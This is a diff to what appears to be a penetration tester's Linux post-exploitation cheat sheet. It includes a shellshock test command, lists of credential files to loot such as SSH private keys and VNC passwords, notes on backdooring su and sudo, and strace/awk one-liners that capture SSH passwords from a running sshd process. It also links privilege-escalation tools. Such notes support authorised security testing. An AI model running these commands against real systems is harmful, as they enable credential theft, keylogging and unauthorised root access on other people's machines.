@@ -262,6 +262,7 @@ find / -type d -user $USER -perm /222 -ls 2>/dev/null | grep -vE " (/proc/|$HOME
 ; only root can read
 find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -user root ! -perm /004 -ls 2>/dev/null
 
+find / -printf '%T+ %M %u %g %p\n' | sort
 rpm -qa --last
 
 shellshock
@@ -270,38 +271,35 @@ ssh -o 'rsaauthentication yes’ 192.168.1.1 '() { ignored; }; id'
 
 wildcard attacks https://www.exploit-db.com/papers/33930/
 
-* common paths
-http://wiki.apache.org/httpd/DistrosDefaultLayout, lfipwn/core/techniques/LFIApacheLog.py, exploit-database/platforms/php/webapps/15964.py
-http://www.blackhatlibrary.net/File_Inclusion
-
-* elevate 
 .*history
 .*rc
-.ssh / known_hosts, config, authorized_keys{,2}, id_rsa, id_dsa
+.ssh{known_hosts,config,authorized_keys{,2},id_rsa,id_dsa}
 .vnc/passwd
-
-https://github.com/b3rito/yodo
 
 grep .*_history for:
   rsh, rhost, rcp, ssh, scp, ...
   su -
   sudo
-identifier les VIP
 
-local root exploits # look at exploit suggesters in tools/post
-sysdig strace systemtab # in tools/post/
-
+target VIPs
 backdoor su, sudo, ...
+keylogger with strace
 capture ssh passwords: sudo strace -f -e read -p <pid_of_sshd> 2>log OR strace -e write -p <pid_of_sshd> 2>&1 | egrep "^write\(.*1\)"
 prettier: strace -p 13909 2>&1 | awk '/^write\(.*1\)/ {gsub(/\"/, "");gsub(/\,/, "");gsub(/\\r/, "\\n");sub(/[0-9]*\)/," ",$2);sub(/\\177/,"\b",$2);sub(/\\t/,"\t",$2);sub(/\\3/,"\^C",$2);printf $2}'
 or python script skl.py from netspi
+sysdig strace systemtab
 
-look into tools/* (eg. lynis)
-
-http://netsec.ws/?p=309 # LinEnum, LinuxPrivChecker, g0tmi1k's blog (http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+local root exploit suggesters: LinEnum, LinuxPrivChecker, http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ etc.
+https://github.com/CISOfy/lynis
+https://github.com/b3rito/yodo
+https://github.com/GTFOBins/GTFOBins.github.io
 
 # bypassing nosuid, noexec
 CVE-2014-5206/CVE-2014-5207 http://seclists.org/oss-sec/2014/q3/352
 
 # Solaris
 dispuid # display a list of all valid user names
+
+# common paths
+http://wiki.apache.org/httpd/DistrosDefaultLayout, lfipwn/core/techniques/LFIApacheLog.py, exploit-database/platforms/php/webapps/15964.py
+http://www.blackhatlibrary.net/File_Inclusion
